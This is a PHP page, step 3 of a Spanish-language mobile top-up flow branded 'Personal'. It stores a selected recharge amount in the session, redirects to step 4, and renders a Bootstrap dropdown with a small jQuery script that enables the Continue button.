<?php
/**
 * STEP 3 - Selección de monto
 */
session_start();

// Guardar monto si viene por POST
if(isset($_POST['amount'])) {
    $_SESSION['amount'] = trim($_POST['amount']);
    header('Location: step4.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monto | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
    <link rel="stylesheet" href="css/op/index.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center">
                            <div class="ml-3 ml-md-5">
                                <img src="assets/flow.svg" class="pl-md-4 img-fluid" style="height: 40px;">
                            </div>
                            <div class="mr-3 mr-md-5">
                                <img src="assets/secure.svg" class="pr-md-4 d-none d-sm-block" style="height: 30px;">
                            </div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 class="text-center mb-4" style="color: #333; font-size: 28px;">Seleccioná el monto</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step3.php">
                            <div class="form-group">
                                <label style="color: #666;">Monto a recargar</label>
                                <select name="amount" id="amount" class="form-control" style="height: 50px; font-size: 16px;" required>
                                    <option value="">Seleccionar monto</option>
                                    <option value="100">$100</option>
                                    <option value="200">$200</option>
                                    <option value="300">$300</option>
                                    <option value="500">$500</option>
                                    <option value="1000">$1000</option>
                                    <option value="2000">$2000</option>
                                </select>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnContinuar" class="btn btn-primary px-4 py-2" disabled style="background: #00a8e1; border: none;">Continuar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script>
        $('#amount').on('change', function(){
            if($(this).val() != '') {
                $('#btnContinuar').prop('disabled', false);
            } else {
                $('#btnContinuar').prop('disabled', true);
            }
        });
    </script>
</body>
</html>